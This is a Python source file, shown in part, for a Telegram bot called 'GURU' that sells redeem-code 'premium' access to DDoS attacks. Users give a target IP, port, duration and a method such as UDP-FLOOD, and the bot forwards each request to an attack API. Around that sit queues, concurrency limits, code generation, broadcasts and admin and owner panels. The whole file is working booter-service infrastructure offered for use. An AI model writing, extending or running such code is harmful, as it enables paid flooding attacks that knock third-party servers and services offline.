    plan, expiry = db.get_user_plan(user_id)
    is_admin = db.is_admin(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await update.message.reply_text(
            f"⏸️ *Bot is Paused*\n\nPlease wait until it's resumed.",
            parse_mode='Markdown'
        )
        return
    
    total_attacks = db.get_user_stats(user_id)
    stats = attack_manager.get_stats()
    attack_count = db.get_attack_count(user_id)
    
    if attack_count < 2:
        max_concurrent = MAX_CONCURRENT_PER_USER_FIRST
        concurrent_info = f"{MAX_CONCURRENT_PER_USER_FIRST} (First 2 attacks)"
    else:
        max_concurrent = MAX_CONCURRENT_PER_USER_LAST
        concurrent_info = f"{MAX_CONCURRENT_PER_USER_LAST} (After 2 attacks)"
    
    if plan == "premium":
        if expiry:
            days_left = max(0, (expiry - datetime.now()).days)
            plan_display = f"💎 PREMIUM ({days_left}d left)"
        else:
            plan_display = "💎 PREMIUM (Lifetime)"
    else:
        plan_display = "🆓 FREE (Redeem code to upgrade)"
    
    first_name = user.first_name or "User"
    user_attacks = stats['user_attacks'].get(user_id, 0)
    
    welcome_msg = (
        f"👋 *WELCOME TO GURU*\n\n"
        f"Hello {first_name}! 👋\n"
        f"📊 Total Attacks: {total_attacks}\n"
        f"📊 Plan: {plan_display}\n"
        f"⚡ Max Concurrent: {MAX_TOTAL_CONCURRENT} total\n"
        f"👤 Your Concurrent: {concurrent_info}\n"
        f"📊 Active Attacks: {user_attacks}/{max_concurrent}\n"
        f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}\n\n"
        f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack IP PORT TIME [METHOD]'}\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION} seconds\n\n"
        f"📡 *Attack Methods:*\n" + "\n".join([f"• {m}" for m in ATTACK_METHODS])
    )
    
    keyboard = []
    if not db.is_banned(user_id):
        keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    if is_owner:
        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
    
    await update.message.reply_text(
        welcome_msg,
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await update.message.reply_text("⏸️ *Bot is Paused*", parse_mode='Markdown')
        return
    
    plan, expiry = db.get_user_plan(user_id)
    is_admin = db.is_admin(user_id)
    
    if plan != "premium" and not is_admin:
        await update.message.reply_text(
            "❌ *PREMIUM REQUIRED*\n\nUse `/redeem CODE` to activate.",
            parse_mode='Markdown'
        )
        return
    
    if plan == "premium" and expiry and expiry < datetime.now():
        await update.message.reply_text("❌ *PLAN EXPIRED*", parse_mode='Markdown')
        return
    
    if db.is_banned(user_id):
        await update.message.reply_text("❌ You are banned!")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            f"❌ *Usage:* `/attack IP PORT TIME [METHOD]`\n\n"
            f"Example: `/attack 91.108.17.41 32001 60 UDP-FLOOD`\n"
            f"Default method: UDP-FLOOD\n\n"
            f"⚡ Total Concurrent: {MAX_TOTAL_CONCURRENT}\n"
            f"👤 First 2 attacks: {MAX_CONCURRENT_PER_USER_FIRST}x concurrent\n"
            f"👤 After 2 attacks: {MAX_CONCURRENT_PER_USER_LAST}x concurrent\n"
            f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        method = args[3].upper() if len(args) > 3 else "UDP-FLOOD"
        if method not in ATTACK_METHODS:
            method = "UDP-FLOOD"
        
        if duration < MIN_DURATION or duration > MAX_DURATION:
            await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            if "concurrent slots are full" in msg.lower() or "Global Cooldown" in msg:
                attack_manager.add_to_queue(user_id, target, port, duration, method, context)
                await update.message.reply_text(
                    f"⏳ *Added to Queue*\n\n{msg}",
                    parse_mode='Markdown'
                )
                return
            else:
                await update.message.reply_text(msg, parse_mode='Markdown')
                return
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, method, 0)
        await send_api_attack(target, port, duration, user_id, context, method)
        
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid port or time!\nError: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await query.edit_message_text("⏸️ *Bot is Paused*", parse_mode='Markdown')
        return
    
    plan, expiry = db.get_user_plan(user_id)
    if plan != "premium" and not db.is_admin(user_id):
        await query.edit_message_text("❌ *PREMIUM REQUIRED*", parse_mode='Markdown')
        return
    
    if db.is_banned(user_id):
        await query.edit_message_text("❌ You are banned!")
        return
    
    can_start, msg = attack_manager.can_start_attack(user_id)
    if not can_start:
        await query.edit_message_text(msg, parse_mode='Markdown')
        return
    
    keyboard = []
    for method in ATTACK_METHODS:
        keyboard.append([InlineKeyboardButton(f"📡 {method}", callback_data=f"method_{method}")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="back")])
    
    stats = attack_manager.get_stats()
    user_attacks = stats['user_attacks'].get(user_id, 0)
    attack_count = db.get_attack_count(user_id)
    max_concurrent = MAX_CONCURRENT_PER_USER_FIRST if attack_count < 2 else MAX_CONCURRENT_PER_USER_LAST
    
    await query.edit_message_text(
        f"💥 *SELECT ATTACK METHOD*\n\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
        f"⚡ Total: {stats['concurrent_busy']}/{MAX_TOTAL_CONCURRENT}\n"
        f"👤 Your Active: {user_attacks}/{max_concurrent}\n"
        f"📊 Attack #{attack_count + 1}\n\n"
        f"After selecting, send: `IP PORT TIME`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    method = query.data.replace('method_', '')
    context.user_data['attack_method'] = method
    
    await query.edit_message_text(
        f"📡 *Method Selected: {method}*\n\n"
        f"Send: `IP PORT TIME`\n"
        f"Example: `91.108.17.41 32001 60`\n\n"
        f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
        f"Send /cancel to cancel",
        parse_mode='Markdown'
    )

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    user_id = update.effective_user.id
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await update.message.reply_text("⏸️ Bot is paused!")
        context.user_data['awaiting_attack'] = False
        return
    
    plan, expiry = db.get_user_plan(user_id)
    if plan != "premium" and not db.is_admin(user_id):
        await update.message.reply_text("❌ Premium required!")
        context.user_data['awaiting_attack'] = False
        return
    
    if db.is_banned(user_id):
        await update.message.reply_text("❌ You are banned!")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        if len(parts) < 3:
            await update.message.reply_text(
                f"❌ Use: `IP PORT TIME`\nExample: `91.108.17.41 32001 60`",
                parse_mode='Markdown'
            )
            return
        
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        method = context.user_data.get('attack_method', 'UDP-FLOOD')
        
        if duration < MIN_DURATION or duration > MAX_DURATION:
            await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            if "concurrent slots are full" in msg.lower() or "Global Cooldown" in msg:
                attack_manager.add_to_queue(user_id, target, port, duration, method, context)
                await update.message.reply_text(
                    f"⏳ *Added to Queue*\n\n{msg}",
                    parse_mode='Markdown'
                )
                context.user_data['awaiting_attack'] = False
                return
            else:
                await update.message.reply_text(msg, parse_mode='Markdown')
                context.user_data['awaiting_attack'] = False
                return
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, method, 0)
        await send_api_attack(target, port, duration, user_id, context, method)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    plan, expiry = db.get_user_plan(user_id)
    attack_count = db.get_attack_count(user_id)
    
    if plan == "free":
        text = (
            "👤 *MY PLAN*\n\n"
            "📊 Plan: 🆓 FREE\n"
            "⏱️ Status: Inactive\n\n"
            "💡 Use `/redeem CODE` to upgrade."
        )
    else:
        if expiry:
            days_left = max(0, (expiry - datetime.now()).days)
            text = (
                "👤 *MY PLAN*\n\n"
                "📊 Plan: 💎 PREMIUM\n"
                f"⏱️ Remaining: {days_left} days\n"
                f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M')}\n\n"
                "📌 Features:\n"
                f"• First 2 attacks: {MAX_CONCURRENT_PER_USER_FIRST}x concurrent\n"
                f"• After 2 attacks: {MAX_CONCURRENT_PER_USER_LAST}x concurrent\n"
                f"• Total concurrent: {MAX_TOTAL_CONCURRENT}\n"
                f"• {len(ATTACK_METHODS)} attack methods\n"
                f"• Attack #{attack_count + 1} next"
            )
        else:
            text = (
                "👤 *MY PLAN*\n\n"
                "📊 Plan: 💎 PREMIUM\n"
                "⏱️ Status: LIFETIME\n\n"
                "📌 Features:\n"
                f"• First 2 attacks: {MAX_CONCURRENT_PER_USER_FIRST}x concurrent\n"
                f"• After 2 attacks: {MAX_CONCURRENT_PER_USER_LAST}x concurrent\n"
                f"• Total concurrent: {MAX_TOTAL_CONCURRENT}\n"
                f"• {len(ATTACK_METHODS)} attack methods\n"
                f"• Attack #{attack_count + 1} next"
            )
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_admin(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    total_attacks = db.get_total_attacks()
    users = db.get_all_users()
    admins = db.get_admins()
    stats = attack_manager.get_stats()
    
    premium_users = sum(1 for u in users if u.get('plan') == 'premium')
    banned_users = len(db.get_banned_users())
    
    await query.edit_message_text(
        f"📊 *BOT STATISTICS*\n\n"
        f"👥 Users: {len(users)}\n"
        f"💎 Premium: {premium_users}\n"
        f"🚫 Banned: {banned_users}\n"
        f"👑 Admins: {len(admins)}\n"
        f"💥 Attacks: {total_attacks}\n"
        f"⚡ Active: {stats['concurrent_busy']}/{stats['max_total']}\n"
        f"⏳ Queue: {stats['queue_size']}\n"
        f"📡 Methods: {len(ATTACK_METHODS)}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_admin(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("➕ GENERATE CODE", callback_data="admin_gen")],
        [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
        [InlineKeyboardButton("🗑️ DELETE UNUSED CODE", callback_data="admin_delete")],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def admin_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("📅 1 DAY", callback_data="gen_1d")],
        [InlineKeyboardButton("📅 3 DAYS", callback_data="gen_3d")],
        [InlineKeyboardButton("📅 7 DAYS", callback_data="gen_7d")],
        [InlineKeyboardButton("📅 30 DAYS", callback_data="gen_30d")],
        [InlineKeyboardButton("📅 LIFETIME", callback_data="gen_lifetime")],
        [InlineKeyboardButton("🔙 BACK", callback_data="admin")]
    ]
    
    await query.edit_message_text(
        "➕ *GENERATE CODE*\n\nSelect duration:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data.split('_')[1]
    if data == "lifetime":
        days = 3650
    else:
        days = int(data.replace('d', ''))
    
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    
    if db.create_code(code, days, query.from_user.id):
        duration_text = "LIFETIME" if days >= 3650 else f"{days} days"
        await query.edit_message_text(
            f"✅ *CODE GENERATED*\n\nCode: `{code}`\nDuration: {duration_text}",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
    else:
        await query.edit_message_text("❌ Failed to generate code!")

async def admin_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    codes = db.get_codes()
    if not codes:
        text = "📋 No codes generated yet."
    else:
        text = "📋 *REDEEM CODES*\n\n"
        for c in codes[:10]:
            status = "✅" if not c.get('is_used') else "❌ Used"
            duration_text = "LIFETIME" if c['access_days'] >= 3650 else f"{c['access_days']}d"
            text += f"`{c['code']}` - {duration_text} - {status}\n"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def admin_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    codes = db.get_codes(only_unused=True)
    if not codes:
        await query.edit_message_text(
            "📋 No unused codes to delete!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
        return
    
    keyboard = []
    for c in codes[:10]:
        code = c['code']
        keyboard.append([InlineKeyboardButton(f"❌ {code}", callback_data=f"delunused_{code}")])
    
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="admin")])
    
    await query.edit_message_text(
        "🗑️ *DELETE UNUSED CODES*\n\nSelect a code to delete:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_delete_unused_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    code = query.data.replace('delunused_', '')
    if db.delete_code(code):
        await query.edit_message_text(
            f"✅ Code `{code}` deleted!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
    else:
        await query.edit_message_text("❌ Failed to delete code!")

async def admin_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📢 *BROADCAST*\n\nSend me the message to broadcast.\nSend /cancel to cancel.",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_broadcast'] = True

async def process_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_broadcast'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_broadcast'] = False
        await update.message.reply_text("✅ Broadcast cancelled.")
        return
    
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        context.user_data['awaiting_broadcast'] = False
        return
    
    users = db.get_all_users()
    total_users = len(users)
    
    if total_users == 0:
        await update.message.reply_text("❌ No users to broadcast to!")
        context.user_data['awaiting_broadcast'] = False
        return
    
    progress_msg = await update.message.reply_text(
        f"📢 *Broadcasting...*\n👥 Total: {total_users}",
        parse_mode='Markdown'
    )
    
    successful = 0
    failed = 0
    message_text = update.message.text
    
    for i, user in enumerate(users):
        user_id2 = user['user_id']
        
        if db.is_banned(user_id2):
            continue
        
        try:
            await context.bot.send_message(
                chat_id=user_id2,
                text=message_text,
                parse_mode='Markdown'
            )
            successful += 1
        except:
            failed += 1
        
        if (i + 1) % 10 == 0:
            try:
                await progress_msg.edit_text(
                    f"📢 *Broadcasting...*\n👥 Progress: {i+1}/{total_users}\n✅ Success: {successful}\n❌ Failed: {failed}",
                    parse_mode='Markdown'
                )
            except:
                pass
        
        await asyncio.sleep(0.05)
    
    await progress_msg.edit_text(
        f"✅ *Broadcast Complete!*\n\n👥 Total: {total_users}\n✅ Successful: {successful}\n❌ Failed: {failed}",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_broadcast'] = False

async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    pause_info = db.get_pause_info()
    pause_status = pause_info.get('paused', False)
    pause_text = "⏸️ PAUSE BOT" if not pause_status else "▶️ RESUME BOT"
    
    keyboard = [
        [InlineKeyboardButton("👑 PROMOTE ADMIN", callback_data="owner_promote")],
        [InlineKeyboardButton("👑 DEMOTE ADMIN", callback_data="owner_demote")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="owner_ban")],
        [InlineKeyboardButton("✅ UNBAN USER", callback_data="owner_unban")],
        [InlineKeyboardButton("📋 LIST ADMINS", callback_data="owner_list_admins")],
        [InlineKeyboardButton("📋 LIST USERS", callback_data="owner_list_users")],
        [InlineKeyboardButton(pause_text, callback_data="owner_pause")],
        [InlineKeyboardButton("🔌 API STATUS", callback_data="owner_api_status")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        f"👑 OWNER PANEL\n\nStatus: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    current_pause = db.get_pause_info().get('paused', False)
    
    if current_pause:
        db.set_pause(False, user_id)
        await query.edit_message_text(
            "✅ *Bot Resumed*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )
    else:
        db.set_pause(True, user_id, "Owner paused")
        await query.edit_message_text(
            "⏸️ *Bot Paused*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )

async def owner_promote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "👑 PROMOTE ADMIN\n\nSend: USER_ID\nSend /cancel to cancel"
    )
    context.user_data['awaiting_promote'] = True

async def process_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_promote'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_promote'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        user = db.get_user(user_id)
        
        if not user:
            await update.message.reply_text(f"❌ User {user_id} not found.")
            return
        
        if db.is_admin(user_id):
            await update.message.reply_text(f"❌ User {user_id} is already an admin!")
            return
        
        db.add_admin(user_id, user.get('username', 'Unknown'), "admin", update.effective_user.id)
        await update.message.reply_text(f"✅ User {user_id} promoted to ADMIN!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_promote'] = False

async def owner_demote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    admins = db.get_admins()
    keyboard = []
    
    for admin in admins:
        admin_id = admin['user_id']
        if admin_id != OWNER_ID and admin.get('level') != "pseudo_owner":
            keyboard.append([InlineKeyboardButton(f"❌ {admin_id}", callback_data=f"demote_{admin_id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="owner")])
    
    await query.edit_message_text(
        "👑 DEMOTE ADMIN\n\nClick an admin to demote:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def process_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = int(query.data.split('_')[1])
    
    if user_id == OWNER_ID:
        await query.edit_message_text("❌ Cannot demote the owner!")
        return
    
    if db.remove_admin(user_id):
        await query.edit_message_text(
            f"✅ Admin {user_id} demoted!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )
    else:
        await query.edit_message_text("❌ Failed to demote!")

async def owner_ban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🚫 BAN USER\n\nSend user ID to ban:\nSend /cancel to cancel"
    )
    context.user_data['awaiting_ban'] = True

async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_ban'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_ban'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        
        if user_id == OWNER_ID:
            await update.message.reply_text("❌ Cannot ban the owner!")
            context.user_data['awaiting_ban'] = False
            return
        
        if db.is_admin(user_id):
            await update.message.reply_text("❌ Cannot ban an admin!")
            context.user_data['awaiting_ban'] = False
            return
        
        db.ban_user(user_id, "Banned by owner", update.effective_user.id)
        await update.message.reply_text(f"✅ User {user_id} banned!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_ban'] = False

async def owner_unban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "✅ UNBAN USER\n\nSend user ID to unban:\nSend /cancel to cancel"
    )
    context.user_data['awaiting_unban'] = True

async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_unban'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_unban'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        db.unban_user(user_id)
        await update.message.reply_text(f"✅ User {user_id} unbanned!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_unban'] = False

async def owner_list_admins_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    admins = db.get_admins()
    if not admins:
        await query.edit_message_text("👑 No admins found.")
        return
    
    text = "👑 ADMIN LIST\n\n"
    for admin in admins:
        level = admin.get('level', 'admin').upper()
        admin_id = admin['user_id']
        text += f"• {admin_id} - {level}\n"
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

async def owner_list_users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    users = db.get_all_users()
    
    if not users:
        await query.edit_message_text("📋 No users found.")
        return
    
    text = "👥 ALL USERS\n\n"
    for user in users[:20]:
        user_id2 = user.get('user_id')
        username = user.get('username', 'N/A')
        plan = user.get('plan', 'free').upper()
        is_banned = "🚫" if user.get('is_banned') else "✅"
        is_admin = "⭐" if db.is_admin(user_id2) else ""
        text += f"{is_banned}{is_admin} {user_id2} - @{username} ({plan})\n"
    
    if len(users) > 20:
        text += f"\n... and {len(users) - 20} more"
    
    await query.edit_message_text(
        text[:4000],
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text("🔌 Checking API Status...")
    
    status, message = await check_api_status()
    
    await query.edit_message_text(
        f"🔌 *API STATUS*\n\n{message}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 REFRESH", callback_data="owner_api_status")],
            [InlineKeyboardButton("🔙 BACK", callback_data="owner")]
        ])
    )

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "🎫 *REDEEM CODE*\n\nSend: `/redeem CODE`\nExample: `/redeem ABC123XYZ`",
            parse_mode='Markdown'
        )
        return
    
    code = args[0].upper()
    
    user = db.get_user(user_id)
    if user and user.get('has_used_code'):
        await update.message.reply_text("❌ You already redeemed a code!")
        return
    
    result = db.use_code(code, user_id)
    
    if result:
        plan, expiry = db.get_user_plan(user_id)
        duration_text = "LIFETIME" if result['access_days'] >= 3650 else f"{result['access_days']} days"
        
        await update.message.reply_text(
            f"✅ *CODE REDEEMED!*\n\nCode: `{code}`\nDuration: {duration_text}\n📊 Plan: PREMIUM\n\n🎉 You now have premium access!",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("❌ *INVALID CODE*\n\nThe code is invalid or already used.", parse_mode='Markdown')

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    users = db.get_all_users()
    
    await update.message.reply_text(
        f"📊 *BOT STATUS*\n\n"
        f"⚡ Active: {stats['concurrent_busy']}/{stats['max_total']}\n"
        f"👥 Users: {len(users)}\n"
        f"⏳ Queue: {stats['queue_size']}\n"
        f"📡 Methods: {len(ATTACK_METHODS)}\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s",
        parse_mode='Markdown'
    )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    user_id = user.id
    is_admin = db.is_admin(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    
    keyboard = []
    if not db.is_banned(user_id):
        keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    if is_owner:
        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
    
    await query.edit_message_text(
        "👋 WELCOME BACK",
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_attack'):
        await process_attack(update, context)
    elif context.user_data.get('awaiting_promote'):
        await process_promote(update, context)
    elif context.user_data.get('awaiting_ban'):
        await process_ban(update, context)
    elif context.user_data.get('awaiting_unban'):
        await process_unban(update, context)
    elif context.user_data.get('awaiting_broadcast'):
        await process_broadcast(update, context)

# ===== RUN BOT =====
application = None

def run_bot():
    global application
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    application = app
    
    # COMMANDS
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    # CALLBACK QUERY HANDLERS
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
    app.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
    app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(admin_gen_callback, pattern="^admin_gen$"))
    app.add_handler(CallbackQueryHandler(process_gen_callback, pattern="^gen_"))
    app.add_handler(CallbackQueryHandler(admin_list_callback, pattern="^admin_list$"))
    app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
    app.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
    app.add_handler(CallbackQueryHandler(process_delete_unused_callback, pattern="^delunused_"))
    app.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
    app.add_handler(CallbackQueryHandler(owner_pause_callback, pattern="^owner_pause$"))
    app.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
    app.add_handler(CallbackQueryHandler(owner_demote_callback, pattern="^owner_demote$"))
